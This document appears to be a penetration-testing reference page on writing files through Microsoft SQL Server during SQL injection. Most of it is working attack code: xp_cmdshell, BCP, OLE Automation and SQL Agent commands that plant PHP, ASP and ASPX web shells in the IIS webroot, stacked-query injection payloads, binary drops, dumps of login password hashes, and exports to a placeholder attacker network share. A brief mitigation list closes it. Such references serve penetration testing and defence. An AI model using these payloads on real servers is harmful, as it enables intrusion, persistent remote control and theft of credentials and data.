---
title: Writing Files
description: Techniques for writing files to the filesystem using MSSQL
category: File Operations
order: 20
tags: ["file operations", "bcp", "xp_cmdshell", "web shell"]
lastUpdated: 2025-12-15
---

## Writing Files

Microsoft SQL Server provides several methods to write files to the server's filesystem, which can be exploited during SQL injection attacks to deploy web shells, exfiltrate data, or establish persistence.

### Prerequisites

To write files from MSSQL, you typically need one of the following:

1. `sysadmin` role membership (for xp_cmdshell, BCP)
2. `Ole Automation Procedures` enabled (for sp_OACreate)
3. Write permissions to target directory for the SQL Server service account

### Using xp_cmdshell

The most straightforward method when enabled:

#### Writing Text Files

```sql
-- Simple file write using echo
EXEC xp_cmdshell 'echo "file contents" > C:\temp\output.txt';

-- Multi-line file (use ^ for line continuation in cmd)
EXEC xp_cmdshell 'echo line1 > C:\temp\file.txt && echo line2 >> C:\temp\file.txt';

-- Using PowerShell for complex content
EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\file.txt -Value ''content here''"';
```

#### Writing Web Shells

**Note:** The caret (`^`) escapes below are for cmd.exe. For PowerShell, use the backtick (`` ` ``) or encode content as base64.

```sql
-- PHP web shell (cmd.exe - uses caret escaping)
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';

-- PHP web shell (PowerShell alternative)
EXEC xp_cmdshell 'powershell -c "''<?php system($_GET[\"cmd\"]); ?>'' | Out-File -Encoding ascii C:\inetpub\wwwroot\shell.php"';

-- ASP classic web shell (cmd.exe)
EXEC xp_cmdshell 'echo ^<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%^> > C:\inetpub\wwwroot\shell.asp';

-- ASPX web shell (base64 decode approach)
EXEC xp_cmdshell 'powershell -c "[IO.File]::WriteAllBytes(''C:\inetpub\wwwroot\shell.aspx'', [Convert]::FromBase64String(''BASE64_ENCODED_SHELL''))"';
```

#### Writing Binary Files

```sql
-- Using certutil to decode base64
EXEC xp_cmdshell 'echo BASE64_DATA > C:\temp\encoded.txt && certutil -decode C:\temp\encoded.txt C:\temp\binary.exe';

-- Using PowerShell
EXEC xp_cmdshell 'powershell -c "[IO.File]::WriteAllBytes(''C:\temp\binary.exe'', [Convert]::FromBase64String(''BASE64_DATA''))"';
```

### Using BCP (Bulk Copy Program)

Export query results to files:

```sql
-- Export query to text file
EXEC xp_cmdshell 'bcp "SELECT name, password_hash FROM sys.sql_logins" queryout "C:\temp\hashes.txt" -c -T';

-- Export specific database data
EXEC xp_cmdshell 'bcp "SELECT * FROM targetdb.dbo.users" queryout "C:\temp\users.csv" -c -T -t","';

-- Write PHP shell (unquoted $_GET[cmd] avoids shell double-quote conflicts)
EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>''" queryout "C:\inetpub\wwwroot\s.php" -c -T';
```

#### BCP Options

| Option | Description                       |
| ------ | --------------------------------- |
| `-c`   | Character data type               |
| `-T`   | Trusted connection (Windows auth) |
| `-t`   | Field terminator (e.g., `-t","`)  |
| `-S`   | Server name                       |
| `-U`   | Username (SQL auth)               |
| `-P`   | Password (SQL auth)               |

### OLE Automation (sp_OACreate)

Use FileSystemObject for file operations:

```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
-- WARNING: This change is instance-wide and persists across restarts.
-- Defenders should monitor sys.configurations for unauthorized changes.

-- Write text file
DECLARE @fso INT, @file INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 'C:\temp\output.txt', 1;
EXEC sp_OAMethod @file, 'WriteLine', NULL, '<?php system($_GET["cmd"]); ?>';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @fso;
```

#### Writing Binary with ADODB.Stream

```sql
DECLARE @stream INT;
EXEC sp_OACreate 'ADODB.Stream', @stream OUTPUT;
EXEC sp_OASetProperty @stream, 'Type', 1;  -- Binary
EXEC sp_OAMethod @stream, 'Open';
EXEC sp_OAMethod @stream, 'Write', NULL, 0x4D5A9000...;  -- Replace with full hex byte sequence
-- Note: 0x4D5A is the 'MZ' DOS header signature for PE executables
EXEC sp_OAMethod @stream, 'SaveToFile', NULL, 'C:\temp\binary.exe', 2;
EXEC sp_OAMethod @stream, 'Close';
EXEC sp_OADestroy @stream;
```

### Using SQL Agent Jobs

Write files via CmdExec job steps:

```sql
-- Create job to write file
EXEC msdb.dbo.sp_add_job @job_name = 'WriteFile';

EXEC msdb.dbo.sp_add_jobstep
    @job_name = 'WriteFile',
    @step_name = 'WriteShell',
    @subsystem = 'CmdExec',
    @command = 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php',
    @on_success_action = 1;

EXEC msdb.dbo.sp_add_jobserver @job_name = 'WriteFile';
EXEC msdb.dbo.sp_start_job @job_name = 'WriteFile';

-- Cleanup
EXEC msdb.dbo.sp_delete_job @job_name = 'WriteFile';
```

### Common Writable Directories

| Directory                     | Description         |
| ----------------------------- | ------------------- |
| `C:\inetpub\wwwroot\`         | IIS web root        |
| `C:\inetpub\wwwroot\uploads\` | Upload directories  |
| `C:\Windows\Temp\`            | System temp         |
| `C:\Users\Public\`            | Public user folder  |
| `C:\ProgramData\`             | Application data    |
| `%TEMP%` (via xp_cmdshell)    | User temp directory |

### SQL Injection Examples

```sql
-- Stacked query to write web shell
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--

-- Using BCP in injection
'; EXEC xp_cmdshell 'bcp "SELECT ''test''" queryout "C:\temp\test.txt" -c -T'--

-- Enable xp_cmdshell and write file
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'echo pwned > C:\temp\test.txt'--
```

### Checking Permissions

```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Check if xp_cmdshell is enabled
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Check if OLE Automation is enabled
SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures';

-- Check SQL Server service account (to understand file system permissions)
EXEC xp_cmdshell 'whoami';
```

### Bypassing Restrictions

#### When xp_cmdshell is Disabled

```sql
-- Try enabling it (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Or use SQL Agent instead
EXEC msdb.dbo.sp_add_job @job_name = 'cmd';
-- ... (see SQL Agent section above)

-- Or use OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
-- ... (see OLE Automation section above)
```

#### When Direct Paths are Blocked

```sql
-- Use environment variables
EXEC xp_cmdshell 'echo test > %TEMP%\test.txt';

-- Use UNC paths to write to network shares
EXEC xp_cmdshell 'echo test > \\attacker\share\test.txt';
```

**Note:** UNC paths require the SQL Server host to have network connectivity to the target SMB share, appropriate firewall rules (outbound port 445), and valid credentials or anonymous access. This will fail in network-isolated environments.

### Data Exfiltration via Files

```sql
-- Export sensitive data
EXEC xp_cmdshell 'bcp "SELECT name, password_hash FROM master.sys.sql_logins" queryout "C:\temp\logins.txt" -c -T';

-- Export to network share
EXEC xp_cmdshell 'bcp "SELECT * FROM secrets" queryout "\\attacker\share\data.txt" -c -T';

-- Compress before exfiltration
EXEC xp_cmdshell 'powershell -c "Compress-Archive -Path C:\temp\data.txt -DestinationPath C:\temp\data.zip"';
```

### Important Constraints

| Constraint            | Description                                       |
| --------------------- | ------------------------------------------------- |
| Service Account Perms | SQL Server service account must have write access |
| Directory Must Exist  | Cannot create directories with most methods       |
| Antivirus             | May block known web shell signatures              |
| File Locks            | Cannot overwrite files in use                     |
| Path Length           | Windows MAX_PATH limit (260 chars) may apply      |

### Mitigation

To prevent unauthorized file writing:

1. Disable `xp_cmdshell` and `Ole Automation Procedures`
2. Run SQL Server service account with minimal file system permissions
3. Use application whitelisting on the server
4. Monitor for suspicious file creation in web directories
5. Restrict SQL Agent job creation permissions
6. Use parameterized queries in applications
